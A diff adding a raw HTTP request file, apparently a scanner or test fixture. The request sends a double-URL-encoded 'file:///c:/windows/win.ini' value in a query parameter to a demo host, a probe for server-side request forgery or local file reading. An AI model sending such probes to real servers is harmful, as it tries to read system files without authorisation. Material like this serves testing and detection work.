@@ -1,0 +1,4 @@
+GET /a?id=file%253A%252F%252F%252Fc%253A%252Fwindows%252Fwin.ini HTTP/1.1
+Host: demo.example.com
+Connection: close
+
